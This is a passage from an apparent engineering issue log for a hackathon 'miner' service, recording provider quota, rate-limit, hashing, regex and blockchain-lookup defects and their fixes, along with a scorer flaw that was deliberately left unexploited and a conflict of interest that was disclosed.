theft (done, 96 routes, 0 stolen); and required the report to show sum and average and to source the
"first on the network" claim, which turned out to be false today. It also named the one lever with a
live-confirmed favourable sign that was not pulled: leaning the payloads of the six intents G56 left
fat (NEWS, CONTENT, AI_TEXT, FACT_CHECK, TELEGRAPH_KNOWLEDGE, TRANSLATION). Not shipped, because no
ground-truth bench exists for any of them (the recovered receipts cover SSL, IP and WALLET only) and
three of the six are #1 or at 1.0 — an unmeasured shape change on those is the G62 pattern.

**Convention note for anyone reading the eight-epoch table:** ratio is ours ÷ leader, written 0 when
the leader is also 0 (CONTENT in 308, 309, 312, 315). Under a ratio-of-averages reading those epochs
are undefined rather than zero; the table averages per-epoch ratios, which is not the published
formula either.

### G80 · The uptime alarm fired twice on MyMemory's quota, and the fallback would have served that quota warning as a translation — `FIXED 2026-09-08`

Scheduled `uptime` runs at 2026-09-07 23:33Z and 2026-09-08 04:45Z failed on one live test, "the
fallback returns a real translation", with `translation providers unavailable`; the `check` and
`scores` jobs passed both times, production answered `bonjour` through Google, and MyMemory answered
from this machine. The test forces Google to fail and requires MyMemory to translate — from GitHub's
shared runner addresses, whose anonymous per-IP daily quota is spent by everyone else on GitHub. Issue
#10 was opened by the alarm with the text "a failing endpoint is likely already costing score", which
was false: this is the G34 pattern, the alarm firing on its own test rather than on the miner.

**Two fixes.** The live test now probes MyMemory first and **skips, stating the provider's status,**
when the provider is the one refusing; it still fails if our parsing breaks while the provider is up.
And a real hole found while reading the fallback: `fetchMyMemory` trusted any HTTP 200, but MyMemory
reports an exhausted quota as **HTTP 200 with `responseStatus: 429`, `quotaFinished: true` and
"MYMEMORY WARNING: YOU USED ALL AVAILABLE FREE TRANSLATIONS FOR TODAY…" in `translatedText`** — the
liar-200 case ARCHITECTURE A5 exists for. Had Google failed on a routed question while the miner's
own egress was over quota, that warning would have been served as the translation. `usableMyMemoryText`
now rejects `quotaFinished`, a non-200 `responseStatus` and the warning prefix, pinned by a unit test
that mocks the quota body and expects the honest upstream-unavailable path instead.

### G81 · OpenAlex is shedding anonymous search, so ACADEMIC_SEARCH answers "no papers" on cache-cold questions; one retry shipped, the real remedy is the operator's — `OPEN 2026-09-08`

Found through the tripwire. After G80 was fixed, a dispatched `uptime` run and two full preflights
each failed exactly one probe: `verify-deploy`'s bare-topic `/papers` check, "0 papers in prose" in
233–389 ms. Probing OpenAlex directly from this machine: **HTTP 429 on five of seven requests four
seconds apart**, body "Anonymous search is temporarily rate-limited while the search cluster is under
elevated load. Please retry in 35s, or use a free API key", one 200 in the middle, and 429 again after
the advertised 35 s. Production answered five papers on five spaced probes only because the
60-second cache was warm from the first; a cache-cold topic during the shedding gets the honest
"No peer-reviewed papers on … were found", which scores ~0 and, for a real caller, is a worse answer
than the truth. This is G43's second failure mode, now observed hitting the live route rather than a
sweep, and the alarm on issue #10 is reporting it correctly — an upstream outage is ours (organizer
answer, 2026-08-30).

**Shipped:** `get()` in `papers.ts` now retries the SAME query once after min(Retry-After, 2.5 s)
when OpenAlex answers 429 or 503, inside the request's own budget, so the primary timeout is not
shortened to fund it; unit-tested with a mocked 429-then-200. Measured value: it catches the bursty
window (one 200 in seven) sometimes, not reliably.

**Not shipped, because it is the operator's decision (G43):** OpenAlex lifts the limit for requests
carrying a contact address (`mailto=`, the "polite pool") or a free API key. The code now sends
either **only if `OPENALEX_MAILTO` or `OPENALEX_API_KEY` is set** in the Vercel environment; nothing
is sent otherwise, and no address was chosen here. One `vercel env add OPENALEX_MAILTO production
--scope wukong4` plus a redeploy closes this. Until then `/papers` degrades honestly during
OpenAlex's load-shedding, and `uptime`'s `check` job will keep failing on that probe whenever the
shedding coincides with a run — an honest red, not a false one.

**Addendum, 09:01Z the same morning:** the next dispatched `uptime` run passed the papers probe (the
retry, 5.7 s) and failed a different fixture instead — `self-signed.badssl.com` reported
`unreachable` in 25 ms from GitHub and timed out at 8.3 s from this machine — while badssl.com
answered every host normally minutes later and production classified the same host `self_signed`.
That is the transient badssl blip the workflow's own comment and G21 already describe, not a defect,
and it is the reason a single red run is never believed without a re-run. The same run also tripped
`verify-deploy`'s hard 5 s p95 budget: the papers retry's 2.5 s wait made a shed-window answer take
5.7 s. Latency is scored, so the wait is now 1.5 s (0.3 s refusal + 1.5 s + a ~3 s answer stays
inside the budget); it buys a shorter retry window in exchange, and that trade is deliberate.

### G82 · Only 45 of 108 canonical intents have a champion scorer, so the expansion ceiling is 32 — `CLOSED 2026-09-08`

The candidate universe for expansion was being read off the intent list. It is not
that list. An intent is only rankable when a champion scorer exists for it, and
`/api/wasm` shows scorers for **45** intents. The other 63 — including
`EMAIL_SECURITY`, `URL_SAFE`, `MACRO_ECONOMIC_INDICATOR` and
`SANCTIONS_SCREENING_MATCH`, all of which look like open ground with zero miners —
return `{"count":0,"intents":{}}` and have no score rows at all. Registering in one
of them buys a leaderboard of one that is never scored.

Two intents have a scorer and still no traffic: `TEXT_AUTHENTICITY_CHECK` (reg 1882)
and `TWITTER_SEARCH` (reg 2061), both with zero scored requests ever.

So the reachable expansion from thirteen intents was **32**, not 93. Recorded in
`track1-miner/docs/EXPANSION_MATRIX.md`.

### G83 · Two champion scorers reward answers we will not serve — `OPEN 2026-09-08`

Measured against the live champions via `tools/candidate-bench.mjs`:

- **GAME_RESULT (champ 1265).** Naming the WRONG winner scores 0.854 and inventing
  a winner for a 2-2 draw scores 0.951, both **above** the correct answer's 0.822.
  It is a lexical similarity metric and does not track correctness.
- **TVL_LOOKUP (champ 49).** On the token-liquidity case an honest "no liquidity
  data could be retrieved" scored above a correct figure against two of three
  ground-truth registers, because the refusal echoes the question's own words.

Neither is exploited. Our ceiling in those two intents is therefore the
honest-answer ceiling, not the scorer's maximum — GAME_RESULT measures 0.787
against a live leader of 0.594, which is still competitive. This is recorded so
that a later session does not "discover" the higher-scoring shapes and take them.

### G84 · ESPN is unreachable from Vercel, and only the deployment showed it — `FIXED 2026-09-08`

`GAME_RESULT` passed every local test and returned `provider_unavailable` for every
fixture in production. ESPN's scoreboard answers this machine and refuses Vercel's
egress; separately it returns **403 to a custom user-agent** and 200 to a browser
one, which is a second, independent block.

Two lessons, both already cost time today. A provider verified from the laptop is
not a provider verified for the miner — reachability now has to be checked with
`npx vercel curl` against a preview before promotion. And the failure was made
worse by control flow: the "no scoreboard responded" branch returned before the
name-search fallback could run, so a working second provider was never tried.
Fixed by attempting the fallback whenever the primary yields nothing, and
reporting `unknown` only when both fail.

### G85 · A shell heredoc turns `\b` into a raw backspace byte, and it happened twice more — `FIXED 2026-09-08`

G74 recorded this once. It recurred twice this session in files written through
`python - <<'PY'`: `/\bon base\b/i` in `intent-answers.mjs` became
`/<0x08>on base<0x08>/i` and failed a correct production answer, and
`RECENCY_WORD` in `newssearch.ts` became `/<0x08>recent…<0x08>/i`, silently
disabling the whole soft-recency window. A third instance was found already in the
tree: the ONCHAIN probe's "a missing transaction was given a gas figure" check had
held a backspace since it was written and had **never been able to fire**.

A quoted heredoc still collapses one level of escaping, and in a Python or JS
string `"\b"` is a backspace character rather than a word boundary. The durable
fix is `miner/test/no-control-bytes.test.ts`, which scans `src`, `test`, `tools`
and `bench` and fails on any raw control byte; it asserts it actually scanned
files, because a scan of nothing passes. Verified to fire by injecting one.
Write regexes with the Write tool, not through a heredoc.

### G86 · The YAML hash to register is the git blob, not the file on disk — `FIXED 2026-09-09`

`core.autocrlf=true` is set and the repo has no `.gitattributes`, so Git checks
`miner.yaml` out with CRLF and stores it with LF. GitHub raw serves the stored
version, which is what the node fetches and hashes. The two differ:

```
local working copy (CRLF)   d517e6a73ca542e8e88ae1391e874c15f826c432709c5d5cae4108a225c2aafb
what GitHub serves (LF)     8d62ebe0136aea75e8185a5536f99687cac7650b31a31a5fb90c5c9aac94d874
```

`REGISTRATION_UPDATE.md` told the operator to run `sha256sum track1-miner/miner.yaml`,
which prints the first one. The console's own **"Generate from file"** button does
the same thing. Either would have put a hash on-chain that does not match the file
the node fetches.

Confirmed as the rule rather than a coincidence: the commit pinned for registration
402 has a blob hash of `7538…7640`, which is exactly what `/api/miners/402` reports
on-chain and exactly what the raw URL serves. Verification is now
`curl -sL "<url>" | sha256sum`, or `git show HEAD:track1-miner/miner.yaml | sha256sum`
— never the working copy.

The hash only came out right in the first place because the file had been written
with LF that session; the rebase onto `origin/main` re-checked it out as CRLF and
the discrepancy appeared. It would have appeared on any fresh clone too.

### G87 · Registration 1378 is live with nineteen intents; 402 superseded — `CLOSED 2026-09-09`

Signed by the operator at 07:47:29Z. Verified from the node, not from the console:

```
/api/miners/1378   active   19 intents   rejection null   retrying false   fetch_attempts 0
                   yaml_hash 8d62ebe0136aea75e8185a5536f99687cac7650b31a31a5fb90c5c9aac94d874
/api/miners/402    superseded   13 intents
```

The recorded `yaml_hash` equals the SHA-256 of the bytes the pinned raw URL actually
serves, which is the check that matters — the hash on chain is a claim, the served
file is the fact. `fetch_attempts 0` means the node fetched and validated it first
time. The console's endpoint validation returned HTTP 200 on all eighteen endpoints
at 234–304 ms.

Handover was clean: 402 kept serving until 1378 activated, so there was no gap.

Monitoring moved the same minute — `REGISTRATION_ID` is now 1378 and
`watch.mjs --once` reports `endpoint=ok 382ms (verdict=valid) activation=active`.
Current-state references in README, TASKS, SETUP, SUBMISSION_CHECKLIST,
TELEGRAPH_FACTS and EXPANSION_MATRIX were repointed. Dated historical entries here
and in MEMORY were deliberately left alone: they record what was true when written.

**Nothing about rank is claimed.** The six new intents have never been scored by the
network. Their honest status is *registered; ranking unverified* until an epoch
lands.

### G88 · ONCHAIN_TX_LOOKUP denied real transactions on chains we already read — `FIXED 2026-09-09`

We entered the intent at **0.006275, rank 10 of 13** in epoch 319 while txlens
crossed at 0.9949. That number is the `not_found` band the bench measured at
0.0059, not the partial-receipt band at 0.01, which is what pointed at the cause.

A hash with **no chain named defaulted to Ethereum**, and a live Base, Arbitrum or
Polygon transaction was answered "does not correspond to any transaction on
ethereum" with confidence 0.9. Reproduced against production with three real
transactions, one per chain. Ethereum was being treated as an assertion when it
was only a reading order.

Fixed: `resolveChain` now reports whether the caller actually chose a chain. When
they did not and the default misses, one endpoint per remaining chain is probed
concurrently and the winner is read properly — about a second in practice. A
chain named explicitly never takes that path, because "is it on Ethereum" is a
real question about Ethereum. When no chain has it, the answer names every chain
checked. Verified live on all three chains after deploy.

**The lesson is about where the defect was found.** Nothing in the test suite or
the gates was wrong; the answer was well-formed, confident and false. It was found
by reading the score we got and asking which measured band it matched.

### G89 · An academic-index outage was reported as an absence of research — `FIXED 2026-09-09`

OpenAlex returned 503 to every request on 2026-09-09 and `/papers` answered "No
peer-reviewed papers on transformer models were found for the requested period."
Both fetch attempts swallow their error and fall through to the same branch, so
an outage and an empty shelf produced the same sentence — the exact thing
ARCHITECTURE A5 forbids, in an intent we have served since August.

`findPapers` now tracks whether the index answered as distinct from whether it
had results. Pinned by tests with a stubbed 503 and a stubbed empty 200.

Two gates had encoded the old wording and failed on the honest one. `intent-answers`
accepted only "no peer-reviewed papers"; it now accepts either honest form and
still fails on silence. `param-shapes` matched "could not be" as a refusal, so
somebody else's outage read as a parsing defect of ours — a gate that fails on an
outage teaches you to ignore it.

### G90 · CVE records were re-fetched often enough to trip NVD's rate limit — `FIXED 2026-09-09`

NVD allows anonymous callers five requests per thirty seconds. The correctness
gate alone trips it, and spot checks run roughly every twenty seconds, so the
shared one-minute cache meant `/cve` intermittently answered `upstream_unavailable`.
Intermittent excellence is the pattern Routing Revocation punishes.

A published CVE record is a static document, so it now caches for six hours; the
cache gained a per-entry TTL to allow that. Unavailable answers keep the short TTL
so a rate-limit window cannot pin a non-answer for six hours. Six rapid requests
now all answer. **The real remedy is an NVD API key** — free, email-issued, and it
raises the limit to fifty per thirty seconds. That is the operator's to request.

### G91 · TVL called a sample maximum "the deepest single pool" — `FIXED 2026-09-09`

DexScreener returns at most 30 pairs for a token and **which 30 varies between
reads**: USDC on Base named AERO/USDC at $33.4M one hour and LAPTOP/USDC at $900k
the next, from a stable 30-pair response each time. The real deepest pool is
larger than either. The answer now says "the largest of the N pools listed for
it", which is what we can actually support. The total itself is unaffected — it
comes from GeckoTerminal's tracked reserve, not from summing the sample.

### G92 · Three intents added on the operator's instruction, two of them known lotteries — `OPEN 2026-09-10`

GAS_PRICE, FINANCIAL_DATA and FRAUD_DETECTION were built because the operator
asked for them after the earlier evidence recommended against two of the three.
That evidence has not changed and is repeated here so nobody re-derives it:

- **GAS_PRICE** — champion 3119's tolerance is about one part in a thousand on a
  quantity that changes every block. Nine miners have sat between 5e-12 and
  3e-11 for months. Ranking here turns on whether our read and the scorer's land
  in the same window, not on engineering.
- **FINANCIAL_DATA** — the token half is solid (GeckoTerminal). The equity half
  carries market data only: Yahoo's `quoteSummary` returns HTTP 401 without a
  session, so P/E and revenue growth are not retrievable keylessly. Those
  questions are answered with what we do hold plus an explicit statement that
  the ratio was not retrieved.
- **FRAUD_DETECTION** — 16 miners, and the judgement is a likelihood rather than
  a fact. What makes it defensible is that every signal is one we actually
  check and name: OFAC's sanctioned-address listing, Cloudflare's threat feed,
  on-chain account state, and specific scam wording.

What was measured and is worth keeping: against champion 3119 the full gas shape
(exact figure, rounded figure, base and priority fee, block, transfer cost)
crosses 3 of 3 ground-truth registers at 0.999999 where a bare figure crosses 1
of 3. Carrying both numeric registers is coverage, not hedging — both are true
statements about the same number.

### G93 · eth_getCode returning bytes no longer means "contract" — `FIXED 2026-09-10`

Under EIP-7702 an externally owned account can carry a 23-byte delegation
designator, `0xef0100` followed by the address it delegates to, and it remains
key-controlled. The first address tested against the new fraud endpoint,
vitalik.eth, returns `0xef01005a7fc11397e9a8ad41bf10bf13f22b0a63f96f6d` and was
being described as "a contract".

That is a false statement about who controls the funds, which is the exact thing
FRAUD_DETECTION is asked about. `accountKind` now distinguishes account,
delegated account and contract, and the distinction is pinned by a test. Any
future code in this repo that reads `eth_getCode` has the same trap.

### G94 · A marker regex ending in `\b` cannot match its own plural — `FIXED 2026-09-10`

`/\bgift card\b/i` does not match "gift cards": the `s` is a word character, so
there is no boundary after "card". The scam-marker list silently failed on the
plural form of the commonest phrasing. Every marker naming a countable thing now
takes an optional `s`, and the test covers both forms. Same family as G85 — a
check that quietly cannot fire.

### G95 · We are about to be the only miner in an intent whose scorer we wrote — `OPEN 2026-09-10`

`TEXT_AUTHENTICITY_CHECK` has **zero miners** and its champion scorer is
registration **1882**, whose `author_address` is
`0xdad201ef02f5c1fbb8f9e931ae9b7c1bf493a39e` — this project's own fee address,
from the Track 2 submission. Registering the intent makes us the only miner in a
field we also supply the judge for.

Four things are true and all four belong in the record:

- It breaks no rule found in the hackathon material. Track 2 was an open
  competition and champions are selected by the protocol, not by their author.
- **It is already the case elsewhere and was never flagged.** `CURRENCY_EXCHANGE`'s
  champion is registration **2945**, also ours, in an eight-miner field we have
  served since 2026-09-09. Zero competitors reads differently from eight.
- Nothing in `src/authenticity.ts` is shaped to that scorer. The module was
  written from the canonical intent description, and the scorer's source was
  deliberately not read while writing it. Benching a champion WASM is what this
  repo does for every intent and is available to anyone.
- The operator was told before building and chose to proceed. That is their call
  to make; the obligation this creates is disclosure, which is why it is here, in
  the README and in `docs/REGISTRATION_UPDATE.md`.

**Open action:** ask the organizers in Discord. The 2026-09-04 lesson was to ask
before doing anything that sits near the protocol's own judgement rather than
discover afterwards that it read as gaming.

### G96 · Two of four new intents inherit provider limits that production cannot fix — `OPEN 2026-09-10`

Both were found by probing a preview through `npx vercel curl` rather than by a
scored epoch, which is G84 working as intended.

- **SPORTS_SCORE cannot see MLB from Vercel.** "Who won the Yankees vs Red Sox
  game?" resolves on this machine and returns `not_found` from the deployment,
  and **`/game-result` behaves identically**, so this is a pre-existing property
  of the fixture providers rather than anything the new endpoint introduced.
  ESPN refuses Vercel's egress and the name directory does not cover the fixture.
  Football resolves on both. The answer is honest either way — no other fixture
  is substituted — but the intent's coverage is narrower in production than in
  tests, and no test can catch it.
- **TOKEN_HOLDER_COUNT cannot report top-1 concentration from Vercel.**
  Blockscout's holders list takes 3.2 to 12.4 seconds and times out against the
  8-second budget every time from the deployment, for large and small tokens
  alike. Two real routed questions ask for the figure. The holder count itself
  always lands, and the answer names the timeout rather than dropping the clause,
  but the figure is not being served. Raising the budget past 9 seconds risks the
  route watchdog taking the whole answer, which is a worse trade than losing a
  secondary field.

Neither is exploitable and neither is hidden. Recorded so a later session does
not "discover" them as new defects and spend a day on an upstream it does not own.

### G116 · Contract activity has one provider and no failover — `PARTLY FIXED 2026-09-13` (renumbered from a duplicate G95)

`/tx-lookup`'s new contract-activity path reads Blockscout and nothing else. The
deployment date and the transaction count are both index facts that no JSON-RPC
endpoint can supply — `eth_getTransactionCount` on a contract returns its nonce,
which counts contracts it created, not transactions sent to it — so there is no
RPC fallback to write.

Blockscout returned **503 across all five chains** within an hour of the feature
going live, which is how this was noticed. The code behaves correctly: it reports
an index outage and does not claim the address has no activity. But the answer is
unavailable for the duration, and `TOKEN_HOLDER_COUNT` shares the same host, so
one provider outage takes two intents down together.

Candidate second sources, none yet measured: Etherscan V2 (one key, all chains,
free tier), or a self-computed count from `eth_getLogs`, which is only an
approximation and would need saying so in the answer. Recorded rather than built,
because a second provider that disagrees with the first is worse than one that is
occasionally down.

### G117 · Research tried each candidate term sequentially and blew the watchdog — `FIXED 2026-09-11` (renumbered from a duplicate G96)

`answerResearch` walked its candidate names one at a time, each costing a full
upstream timeout when neither index held the name. Measured at **23 seconds** for
a nonsense subject, against a route watchdog of **11** — so the honest "no
evidence in these indexes" answer could never be served, and the watchdog's
generic outage sentence went out instead.

Both passes now fire every candidate concurrently and restore preference by
walking results in candidate order rather than completion order. Worst case is
**6.2 s**, answers for the real routed questions are byte-identical, and the test
now asserts the latency bound rather than only the wording.
